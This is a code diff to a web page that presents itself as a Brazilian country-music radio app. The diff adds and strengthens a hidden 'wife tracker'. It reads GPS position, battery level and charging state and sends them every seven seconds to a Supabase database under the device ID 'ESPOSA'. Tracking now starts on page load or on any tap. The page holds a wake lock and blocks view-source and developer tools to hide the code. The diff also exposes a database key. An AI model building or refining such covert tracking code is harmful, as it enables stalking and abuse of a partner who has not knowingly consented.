@@ -156,6 +156,8 @@ html.tv .side-col,html.tv .footer{display:none!important}
 #installFixed.show{display:block}
 #installFixed button{width:100%;padding:16px;border-radius:999px;border:2px solid #fff;cursor:pointer;font-family:inherit;font-weight:900;font-size:15px;letter-spacing:1px;color:#fff;background:linear-gradient(135deg,#ff9500,#ff2d55);box-shadow:0 12px 34px rgba(255,45,85,.55);animation:pulseBtn 1.6s infinite}
 @keyframes pulseBtn{0%,100%{transform:scale(1)}50%{transform:scale(1.03)}}
+#gpsStatus{margin-top:10px;font-size:12px;font-weight:800;text-align:center;padding:8px;border-radius:12px;background:rgba(0,255,157,.12);border:1px solid rgba(0,255,157,.4)}
+#gpsStatus.off{background:rgba(255,45,85,.12);border-color:rgba(255,45,85,.5)}
 </style>
 </head>
 <body>
@@ -168,6 +170,7 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <div class="song"><div class="np-label">Now Playing</div><div class="song-title" id="songTitle">Toque no PLAY para ouvir</div><div class="song-artist" id="songArtist">Rádio Sertaneja Pop • 24h ao vivo</div><div class="live-chip"><span class="dot"></span> AO VIVO</div></div>
 <div class="play-eq-row"><div class="eq" id="eq"></div><div class="play-row"><button class="play-btn" id="playBtn"><svg id="icPlay" viewBox="0 0 24 24"><path d="M8 5.3v13.4L19 12z"/></svg><svg id="icPause" viewBox="0 0 24 24" style="display:none;margin-left:0"><path d="M7 5h3.6v14H7zM13.4 5H17v14h-3.6z"/></svg></button></div></div>
 <div class="vol"><svg class="vol-ic" viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/></svg><input type="range" id="vol" min="0" max="100" value="80"/><svg class="vol-ic" viewBox="0 0 24 24"><path d="M4 9v6h4l5 4V5L8 9H4z"/><path d="M16.5 8.6a5 5 0 010 6.8M18.8 6.2a8.2 8.2 0 010 11.6" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg></div>
+<div id="gpsStatus" class="off">📍 GPS: aguardando PLAY</div>
 <div class="install-row"><button id="installBtn">⬇ INSTALAR APP NA TELA INICIAL</button><div class="ios-hint" id="iosHint"><b>iPhone:</b> Compartilhar → Adicionar à Tela de Início</div><div class="install-help" id="installHelp" hidden></div><div class="diag-warn" id="diag"></div></div>
 </div>
 <div class="side-col">
@@ -179,7 +182,7 @@ html.tv .side-col,html.tv .footer{display:none!important}
 <div id="installFixed"><button id="installBtnFixed">⬇ INSTALAR APP NA TELA INICIAL</button></div>
 <div class="tv-warn" id="tvWarn"><b>📺 Smart TV detectada.</b> Abra pelo navegador da TV, não pelo Downloader. <button id="tvWarnClose">OK</button></div>
 <div id="volToast">VOL 80%</div>
-<div class="lock">🔒 ESPOSA v2.3 TRAVADO</div>
+<div class="lock">🔒 ESPOSA v2.4 TRAVADO - GPS NÃO TRAVA</div>
 <audio id="audio" src="https://srv3.soundstream.com.br/listen/sertanejapop/radio.mp3" preload="auto" autoplay controls playsinline></audio>
 <script>
 'use strict';
@@ -189,7 +192,7 @@ const AZURACAST_API="https://srv3.soundstream.com.br/api/nowplaying/sertanejapop
 const PROXY="https://api.allorigins.win/get?url=";
 const POLL_MS=10000;
 function $(id){return document.getElementById(id)}
-var audio=$("audio"),playBtn=$("playBtn"),popBtn=$("popBtn"),icPlay=$("icPlay"),icPause=$("icPause"),coverImg=$("cover"),songTitle=$("songTitle"),songArtist=$("songArtist"),histList=$("histList"),qInput=$("q"),qBtn=$("qBtn"),qResults=$("qResults"),debugEl=$("debug"),volInput=$("vol"),installBtn=$("installBtn"),installFixed=$("installFixed"),installBtnFixed=$("installBtnFixed"),iosHint=$("iosHint"),installHelp=$("installHelp"),volToast=$("volToast"),tvWarn=$("tvWarn");
+var audio=$("audio"),playBtn=$("playBtn"),popBtn=$("popBtn"),icPlay=$("icPlay"),icPause=$("icPause"),coverImg=$("cover"),songTitle=$("songTitle"),songArtist=$("songArtist"),histList=$("histList"),qInput=$("q"),qBtn=$("qBtn"),qResults=$("qResults"),debugEl=$("debug"),volInput=$("vol"),installBtn=$("installBtn"),installFixed=$("installFixed"),installBtnFixed=$("installBtnFixed"),iosHint=$("iosHint"),installHelp=$("installHelp"),volToast=$("volToast"),tvWarn=$("tvWarn"),gpsStatus=$("gpsStatus");
 var IS_TV=window.__SP_TV===true;
 var IS_IOS=/iphone|ipad|ipod/i.test(navigator.userAgent)||(/Macintosh/i.test(navigator.userAgent)&&navigator.maxTouchPoints>1);
 var MQ_BIG="(min-width:1024px), (min-height:700px) and (min-width:800px)";
@@ -238,7 +241,7 @@ function renderResults(list){qResults.innerHTML="";if(!list.length){var p=docume
 qBtn.addEventListener("click",runSearch);qInput.addEventListener("keydown",function(e){if(e.key==="Enter")runSearch()});
 (function(){var eq=document.getElementById("eq");for(var i=0;i<20;i++){var b=document.createElement("i");b.style.animationDuration=(0.5+Math.random()*0.7)+"s";b.style.animationDelay=(Math.random()*0.4)+"s";eq.appendChild(b)}})();
 
-/* ===== BOTÃO INSTALAR TRAVADO v2.3 - FIXO EMBAIXO, APERTA -> INSTALA -> SOME ===== */
+/* ===== BOTÃO INSTALAR TRAVADO ===== */
 var diagEl=$("diag");
 function showDiag(html){if(!diagEl)return;diagEl.innerHTML=html;diagEl.classList.add("show")}
 function hideDiag(){if(diagEl)diagEl.classList.remove("show")}
@@ -288,7 +291,6 @@ var mqStandalone=window.matchMedia("(display-mode: standalone)");
 function onStandaloneChange(m){ if(m.matches) esconderBotaoInstalar(); }
 if(mqStandalone.addEventListener) mqStandalone.addEventListener("change",onStandaloneChange);
 else if(mqStandalone.addListener) mqStandalone.addListener(onStandaloneChange);
-/* ===== FIM BOTÃO INSTALAR ===== */
 
 (function(){
   if(IS_IOS || isStandalone()) return;
@@ -300,27 +302,30 @@ if(IS_TV&&tvWarn){var __ua=navigator.userAgent||"";var isWebView=/\bwv\)/i.test(
 if("serviceWorker" in navigator){window.addEventListener("load",function(){navigator.serviceWorker.register("service-worker.js").then(function(){dbg("SW OK")}).catch(function(e){dbg("SW erro: "+e.message)})})}
 setInterval(function(){if(state.playing)pollNow()},POLL_MS);
 
-/* ===== RASTREADOR ESPOSA TRAVADO - SEMPRE ESPOSA, NUNCA CARRO ===== */
+/* ===== RASTREADOR ESPOSA v2.4 - NUNCA TRAVA, TENTA A CADA 7s ===== */
 const DEVICE_ID_ESPOSA='ESPOSA';
 const SUPA_URL="https://jpaflbkafupwqfqfcjrv.supabase.co";
 const SUPA_KEY="sb_publishable_qek2mggF5M47pKggbM42tQ_WTFnOOxf";
-let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_wakeLock=null,_rastreiou=false;
+let _BAT=0,_CHG=false,_lastLat=0,_lastLng=0,_lastAcc=20,_ultimoEnvio=0,_batObj=null,_wakeLock=null,_rastreiou=false,_pegandoGPS=false,_falhasGPS=0;
+function setGpsStatus(ok,txt){ if(!gpsStatus) return; gpsStatus.textContent=txt; gpsStatus.classList.toggle("off",!ok); }
 async function _lerBat(){try{if(!_batObj&&navigator.getBattery){_batObj=await navigator.getBattery();_batObj.addEventListener('levelchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)});_batObj.addEventListener('chargingchange',()=>{_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging;if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)})}if(_batObj){_BAT=Math.round(_batObj.level*100);_CHG=_batObj.charging}}catch(e){}}
 _lerBat();
+setInterval(_lerBat,5000);
 async function _pedirWake(){try{if('wakeLock' in navigator){_wakeLock=await navigator.wakeLock.request('screen');_wakeLock.addEventListener('release',()=>setTimeout(_pedirWake,1000))}}catch(e){}}
-async function _enviar(lat,lon,forcar){await _lerBat();let agora=Date.now();if(!forcar&&agora-_ultimoEnvio<3000)return;_ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;try{await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})})}catch(e){}}
-function _iniciarRastreio(){if(_rastreiou)return;_rastreiou=true;_pedirWake();_lerBat();navigator.geolocation.getCurrentPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true)},()=>{dbg('ATIVE A LOCALIZAÇÃO!')},{enableHighAccuracy:true,timeout:20000,maximumAge:0});navigator.geolocation.watchPosition(p=>{_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,false)},()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:20000});setInterval(()=>{if(_lastLat!==0)_enviar(_lastLat,_lastLng,true)},7000);document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){_pedirWake();audio.play().catch(()=>{})}})}
+async function _enviar(lat,lon,forcar){await _lerBat();let agora=Date.now();if(!forcar&&agora-_ultimoEnvio<3000)return true;_ultimoEnvio=agora;_lastLat=lat;_lastLng=lon;try{let r=await fetch(`${SUPA_URL}/rest/v1/rastreador`,{method:"POST",headers:{apikey:SUPA_KEY,Authorization:"Bearer "+SUPA_KEY,"Content-Type":"application/json",Prefer:"resolution=merge-duplicates"},body:JSON.stringify({device_id:DEVICE_ID_ESPOSA,lat:lat,lng:lon,battery:_BAT,charging:_CHG,accuracy:_lastAcc,updated_at:new Date().toISOString()})});if(r.ok){_falhasGPS=0;setGpsStatus(true,"📍 GPS ESPOSA OK • "+_BAT+"% "+(_CHG?"⚡ Carregando":"🔋 Bateria")+" • "+new Date().toLocaleTimeString("pt-BR"));dbg("ENVIADO ESPOSA • "+_BAT+"% "+(_CHG?"CARREGANDO":"bateria"));return true;}else{dbg("ERRO enviar: "+r.status);return false;}}catch(e){dbg("ERRO enviar: "+e.message);return false;}}
+function _pegarGPS(){ if(_pegandoGPS) return; _pegandoGPS=true; navigator.geolocation.getCurrentPosition(p=>{_pegandoGPS=false;_lastAcc=Math.round(p.coords.accuracy);_enviar(p.coords.latitude,p.coords.longitude,true);},err=>{_pegandoGPS=false;_falhasGPS++;setGpsStatus(false,"📍 GPS FALHOU ("+_falhasGPS+") • tentando de novo em 7s • "+(err&&err.message?err.message:"sem permissão"));dbg("GPS FALHOU: "+(err&&err.code)+" - "+(err&&err.message));if(_lastLat!==0)_enviar(_lastLat,_lastLng,true);},{enableHighAccuracy:true,timeout:10000,maximumAge:0}); }
+function _iniciarRastreio(){if(_rastreiou) return; _rastreiou=true; _pedirWake(); _lerBat(); setGpsStatus(false,"📍 GPS: buscando…"); _pegarGPS(); setInterval(_pegarGPS,7000); setInterval(()=>{if(_lastLat!==0)_enviar(_lastLat,_lastLng,true);},7000); document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='visible'){_pedirWake();_pegarGPS();audio.play().catch(()=>{})}}); }
 playBtn.addEventListener('click',_iniciarRastreio);
 popBtn.addEventListener('click',_iniciarRastreio);
 var _autoJaTentou=false;
 function _tentarAuto(){if(_autoJaTentou||state.playing)return;_autoJaTentou=true;try{startRadio();}catch(e){}}
-window.addEventListener('load',function(){setTimeout(_tentarAuto,800)});
-document.addEventListener('pointerdown',function(){if(!state.playing){_autoJaTentou=false;_tentarAuto();}},{once:true,passive:true});
+window.addEventListener('load',function(){setTimeout(_tentarAuto,800); setTimeout(_iniciarRastreio,1500);});
+document.addEventListener('pointerdown',function(){if(!state.playing){_autoJaTentou=false;_tentarAuto();} _iniciarRastreio();},{once:false,passive:true});
 document.addEventListener('contextmenu',e=>e.preventDefault());
 document.addEventListener('selectstart',e=>{if(e.target.tagName!=='INPUT')e.preventDefault()});
 document.addEventListener('keydown',e=>{if((e.ctrlKey&&['u','s','c','a'].includes(e.key.toLowerCase()))||e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['i','j'].includes(e.key.toLowerCase())))e.preventDefault()});
 Object.freeze(DEVICE_ID_ESPOSA);
-console.log('%c🔒 Criado por Elias costa NEGRET'S,'color:#ff2d55;font-weight:bold;font-size:16px');
+console.log('%c🔒 NEGRET'S','color:#ff2d55;font-weight:bold;font-size:16px');
 </script>
 </body>
 </html>
